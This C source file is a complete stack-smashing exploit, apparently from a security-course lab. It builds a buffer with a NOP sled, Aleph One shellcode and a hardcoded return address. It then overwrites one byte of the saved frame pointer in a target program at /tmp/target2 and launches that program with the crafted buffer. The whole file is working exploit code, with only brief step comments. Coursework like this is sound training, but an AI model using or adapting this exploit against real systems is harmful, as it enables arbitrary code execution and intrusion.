#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define NOOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[241];

  //Steps
  //1. add noop sled to so that eip falls into noop for safe landing
  memset(buf, NOOP, 241);

  //2. add shellcode from alephone
  strncpy(buf + 190, shellcode, 45);

  //3. new EIP after modifying least significant byte of SFP. This is our landing address somewhere in buffer. 
  strncpy(buf + 236, "\x10", 1);
  strncpy(buf + 237, "\xfd", 1);
  strncpy(buf + 238, "\xff", 1);
  strncpy(buf + 239, "\xbf", 1);

  //4. last byte to overwrite the least significant byte of SFP in bar().
  strncpy(buf + 240, "\x70", 1);


  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
